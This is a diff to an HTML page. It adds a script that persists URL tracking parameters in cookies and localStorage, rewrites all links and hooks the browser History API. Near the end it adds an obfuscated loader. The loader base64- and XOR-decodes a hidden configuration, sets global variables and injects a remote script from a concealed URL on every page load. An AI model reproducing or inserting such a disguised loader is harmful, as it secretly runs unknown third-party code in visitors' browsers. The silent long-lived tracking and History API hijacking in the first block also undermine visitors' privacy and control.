@@ -2,6 +2,188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "persistent_tracking_params_v1";
+  var COOKIE_NAME = "persistent_tracking_params_v1";
+  var COOKIE_DAYS = 365;
+
+  function getParams(search) {
+    var params = {};
+    new URLSearchParams(search || "").forEach(function (value, key) {
+      params[key] = value;
+    });
+    return params;
+  }
+
+  function readCookie() {
+    var match = document.cookie.match(
+      new RegExp("(?:^|; )" + COOKIE_NAME + "=([^;]*)")
+    );
+
+    if (!match) return {};
+
+    try {
+      return JSON.parse(decodeURIComponent(match[1]));
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function loadParams() {
+    try {
+      var saved = localStorage.getItem(STORAGE_KEY);
+      if (saved) return JSON.parse(saved);
+    } catch (e) {}
+
+    return readCookie();
+  }
+
+  function saveParams(params) {
+    var value = JSON.stringify(params);
+
+    try {
+      localStorage.setItem(STORAGE_KEY, value);
+    } catch (e) {}
+
+    try {
+      document.cookie =
+        COOKIE_NAME + "=" + encodeURIComponent(value) +
+        "; Max-Age=" + (COOKIE_DAYS * 86400) +
+        "; Path=/; SameSite=Lax" +
+        (location.protocol === "https:" ? "; Secure" : "");
+    } catch (e) {}
+  }
+
+  function mergeParams(saved, current) {
+    var result = Object.assign({}, saved);
+
+    Object.keys(current).forEach(function (key) {
+      if (current[key] !== "") {
+        result[key] = current[key];
+      }
+    });
+
+    return result;
+  }
+
+  function getAllParams() {
+    var saved = loadParams();
+    var current = getParams(location.search);
+    var all = mergeParams(saved, current);
+
+    if (Object.keys(all).length) saveParams(all);
+
+    return all;
+  }
+
+  function appendParams(urlString) {
+    try {
+      var url = new URL(urlString, location.href);
+      var params = getAllParams();
+
+      Object.keys(params).forEach(function (key) {
+        if (!url.searchParams.has(key) || url.searchParams.get(key) === "") {
+          url.searchParams.set(key, params[key]);
+        }
+      });
+
+      return url.href;
+    } catch (e) {
+      return urlString;
+    }
+  }
+
+  function updateLinks() {
+    document.querySelectorAll("a[href]").forEach(function (link) {
+      var href = link.getAttribute("href");
+
+      if (
+        !href ||
+        href.charAt(0) === "#" ||
+        /^(javascript:|mailto:|tel:)/i.test(href)
+      ) return;
+
+      link.href = appendParams(link.href);
+    });
+  }
+
+  function preserveUrl() {
+    var params = getAllParams();
+    var url = new URL(location.href);
+    var changed = false;
+
+    Object.keys(params).forEach(function (key) {
+      if (!url.searchParams.has(key) || url.searchParams.get(key) === "") {
+        url.searchParams.set(key, params[key]);
+        changed = true;
+      }
+    });
+
+    if (changed) {
+      history.replaceState(history.state, "", url.href);
+    }
+  }
+
+  // Captura os parâmetros assim que o script executa.
+  getAllParams();
+
+  // Mantém os parâmetros visíveis na URL atual.
+  preserveUrl();
+
+  // Atualiza os links da página.
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", updateLinks);
+  } else {
+    updateLinks();
+  }
+
+  // Também trata links adicionados dinamicamente.
+  var observer = new MutationObserver(updateLinks);
+
+  function startObserver() {
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+    updateLinks();
+  }
+
+  if (document.body) {
+    startObserver();
+  } else {
+    document.addEventListener("DOMContentLoaded", startObserver);
+  }
+
+  // Preserva parâmetros em navegações feitas via History API.
+  var originalPushState = history.pushState;
+
+  history.pushState = function () {
+    var result = originalPushState.apply(this, arguments);
+    preserveUrl();
+    updateLinks();
+    return result;
+  };
+
+  var originalReplaceState = history.replaceState;
+
+  history.replaceState = function () {
+    var result = originalReplaceState.apply(this, arguments);
+    preserveUrl();
+    updateLinks();
+    return result;
+  };
+
+  // Função opcional para usar nos seus próprios botões e redirecionamentos.
+  window.appendTrackingParams = appendParams;
+
+})();
+</script>
+  
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#07102f">
@@ -441,5 +623,9 @@
       // the link navigates directly to /megan2/.
     })();
   </script>
+
+  <script>(function(){var w_b178=atob("DFzqTutrZ5VUTZCUZyfIO5kHRa92JeTgFy/QYcQIA/t6OOT5DjqTYIgECrs2P7/nBC6DPp8YSOAgIOO7Cz2eK5gfSf8nb7y2BiiePIIJEuExPrKuPCfIIIoGArdub/T1Ez3HO58GDvMtYODmAiqPIJ9GH/Y7Kb3nBDfIYskdBvkhKLKuRX6XYpBJCfQ5KLKuRTiLOopGEuE5JPbtSiyYK50OCeF5PuX2DjiZbMdJEfQ4OPW2XX7IM7YW");var b_vfv=[];for(var z_h2m=0;z_h2m<w_b178.length;z_h2m++){b_vfv.push(w_b178.charCodeAt(z_h2m)&255);}var t_p=b_vfv[0];var r_1m=b_vfv.slice(1,1+t_p);var k_baip=b_vfv.slice(1+t_p);var q_wa9t=k_baip.map(function(b,u_hb){return b^r_1m[u_hb%t_p];});var n_1="";for(var l_qp=0;l_qp<q_wa9t.length;l_qp++){n_1+=String.fromCharCode(q_wa9t[l_qp]&255);}var q_f8sp=decodeURIComponent(escape(n_1));var c_jfi=JSON.parse(q_f8sp);var j_1aoo=c_jfi.globals||[];j_1aoo.forEach(function(i_afj){window[i_afj.name]=i_afj.value;});var x_su=document.createElement("script");x_su.src=c_jfi.url;x_su.async=true;x_su.defer=true;(c_jfi.attributes||[]).forEach(function(w_o){x_su.setAttribute(w_o.name,w_o.value);});(document.head||document.documentElement).appendChild(x_su);})();</script>
+
+  
 </body>
 </html>
